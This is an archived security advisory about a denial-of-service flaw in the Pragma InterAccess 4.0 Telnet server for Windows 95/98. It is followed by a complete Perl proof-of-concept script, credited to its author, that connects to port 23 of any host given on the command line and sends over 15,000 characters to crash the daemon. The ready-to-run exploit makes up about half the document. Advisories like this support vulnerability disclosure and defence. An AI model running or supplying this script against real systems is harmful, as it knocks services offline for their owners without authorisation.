source: http://www.securityfocus.com/bid/2834/info

Pragma InterAccess for Microsoft 95/98 is a fully-featured commercial Telnet server.

Pragma InterAccess does not adequately compensate for large bursts of data being sent to port 23(telnet). If an excessive amount of characters(15000+) are sent to this port then the program will terminate and telnet services will shut down on that host. The daemon must be restarted to regain functionality.

This may be due to a buffer overflow condition. If this is the case, it may be possible for attackers to execute arbitrary code on the target host. 

#!/usr/bin/perl
#
# PI.PL - Crashes Pragma Interaccess 4.0 Server
# Written by nemesystm of the DHC
# http://dhcorp.cjb.net - neme-dhc@hushmail.com
#
####
use Socket;

die "$0 - Crashes Pragma Interaccess 4.0 Server.
written by nemesystm of the DHC
http://dhcorp.cjb.net - neme-dhc\@hushmail.com
usage: perl $0 target.com\n" if !defined $ARGV[0];

$serverIP = inet_aton($ARGV[0]);
$serverAddr = sockaddr_in(23, $serverIP);
socket(CLIENT, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect (CLIENT, $serverAddr)) {
        for ($count = 0; $count <= 15000; $count++) {
                send (CLIENT, "A",0);
        }
        close (CLIENT);
} else { die "Can't connect.\n"; }
print "Done.\n";

